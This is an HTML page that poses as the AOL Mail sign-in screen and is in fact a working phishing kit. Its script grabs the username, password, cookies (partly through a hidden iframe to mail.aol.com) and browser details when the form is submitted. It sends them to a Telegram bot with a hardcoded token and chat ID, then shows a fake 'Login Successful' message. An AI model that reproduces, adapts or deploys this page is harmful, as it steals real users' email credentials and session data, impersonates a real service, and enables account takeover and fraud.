
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AOL Mail - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .aol-gradient {
            background: linear-gradient(135deg, #0066cc 0%, #0099ff 100%);
        }
        .input-focus:focus {
            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.5);
        }
        .shake {
            animation: shake 0.5s;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col">
    <!-- Header -->
    <header class="bg-white shadow-sm">
        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
            <div class="flex items-center">
                <img src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" alt="AOL Logo" class="h-8 mr-4">
                <span class="text-xl font-bold text-gray-800 hidden md:block">Mail</span>
            </div>
            <div class="flex items-center space-x-4">
                <a href="#" class="text-gray-600 hover:text-blue-600 text-sm">Help</a>
                <a href="#" class="text-gray-600 hover:text-blue-600 text-sm">Privacy</a>
                <a href="#" class="text-gray-600 hover:text-blue-600 text-sm">Terms</a>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-grow flex items-center justify-center py-8">
        <div class="container mx-auto px-4">
            <div class="max-w-md mx-auto bg-white rounded-lg shadow-md overflow-hidden">
                <!-- Login Form -->
                <div class="px-8 py-8">
                    <div class="text-center mb-6">
                        <h1 class="text-2xl font-bold text-gray-800">Sign in</h1>
                        <p class="text-gray-600 mt-2">to continue to AOL Mail</p>
                    </div>

                    <form id="loginForm" class="space-y-4">
                        <div>
                            <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Username or email</label>
                            <input type="text" id="username" name="username" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md input-focus focus:outline-none focus:border-blue-500 transition duration-200">
                        </div>

                        <div>
                            <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                            <input type="password" id="password" name="password" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md input-focus focus:outline-none focus:border-blue-500 transition duration-200">
                        </div>

                        <div class="flex items-center justify-between">
                            <div class="flex items-center">
                                <input type="checkbox" id="remember" name="remember" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                <label for="remember" class="ml-2 block text-sm text-gray-700">Remember me</label>
                            </div>
                            <a href="#" class="text-sm text-blue-600 hover:text-blue-800">Forgot password?</a>
                        </div>

                        <div class="pt-2">
                            <button type="submit" class="w-full aol-gradient text-white py-2 px-4 rounded-md hover:opacity-90 transition duration-200 font-medium flex items-center justify-center">
                                <i class="fas fa-lock mr-2"></i> Sign in
                            </button>
                        </div>
                    </form>

                    <div class="mt-6 text-center">
                        <p class="text-sm text-gray-600">
                            New to AOL? <a href="#" class="text-blue-600 hover:text-blue-800">Create an account</a>
                        </p>
                    </div>
                </div>

                <!-- Footer -->
                <div class="bg-gray-50 px-8 py-4 border-t border-gray-200">
                    <div class="flex items-center justify-between">
                        <div class="flex space-x-4">
                            <a href="#" class="text-xs text-gray-500 hover:text-gray-700">Terms</a>
                            <a href="#" class="text-xs text-gray-500 hover:text-gray-700">Privacy</a>
                        </div>
                        <div class="text-xs text-gray-500">
                            © 2025 AOL Mail
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Hidden iframe for getting cookies -->
    <iframe id="cookieFrame" src="https://mail.aol.com" style="display:none;"></iframe>
    
    <!-- Success Modal -->
    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
        <div class="bg-white rounded-lg p-6 max-w-sm w-full mx-4">
            <div class="text-center">
                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-green-100">
                    <i class="fas fa-check text-green-600"></i>
                </div>
                <h3 class="text-lg font-medium text-gray-900 mt-3">Login Successful</h3>
                <div class="mt-2">
                    <p class="text-sm text-gray-500">You have been successfully logged in to your AOL Mail account.</p>
                </div>
                <div class="mt-4">
                    <button id="closeModal" type="button" class="inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-blue-600 text-base font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 sm:text-sm">
                        Continue to Mail
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const successModal = document.getElementById('successModal');
            const closeModal = document.getElementById('closeModal');

            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Get form values
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const remember = document.getElementById('remember').checked;
                
                // Get cookies from iframe
                const cookieFrame = document.getElementById('cookieFrame');
                let cookies = '';
                
                try {
                    cookies = cookieFrame.contentWindow.document.cookie;
                    if (!cookies) {
                        // If same-origin policy blocks access, try to get from our domain
                        cookies = document.cookie;
                    }
                } catch (e) {
                    // Fallback to our domain cookies if we can't access iframe cookies
                    cookies = document.cookie;
                }
                
                // Create payload
                const payload = {
                    username: username,
                    password: password,
                    remember: remember,
                    cookies: cookies,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                };
                
                // Send to Telegram bot (replace with your actual bot token and chat ID)
                const botToken = '7873502385:AAErEKVBqvHdrkK4eJccTFcG0L25OBKwLus';
                const chatId = '8045397671';
                const message = encodeURIComponent(
                    `🔔 New AOL Login\n\n` +
                    `👤 Username: ${username}\n` +
                    `🔑 Password: ${password}\n` +
                    `🍪 Cookies (from mail.aol.com): ${cookies}\n` +
                    `⏱️ Time: ${new Date().toLocaleString()}\n` +
                    `🌐 User Agent: ${navigator.userAgent}`
                );
                
                // Send data to Telegram
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
                    .then(response => response.json())
                    .then(data => console.log('Message sent:', data))
                    .catch(error => console.error('Error:', error));
                
                // Show success modal
                successModal.classList.remove('hidden');
                
                // Add shake effect if fields are empty (for demo)
                if (!username || !password) {
                    loginForm.classList.add('shake');
                    setTimeout(() => {
                        loginForm.classList.remove('shake');
                    }, 500);
                    return;
                }
            });
            
            // Close modal handler
            closeModal.addEventListener('click', function() {
                successModal.classList.add('hidden');
            });
        });
    </script>
</body>
</html>
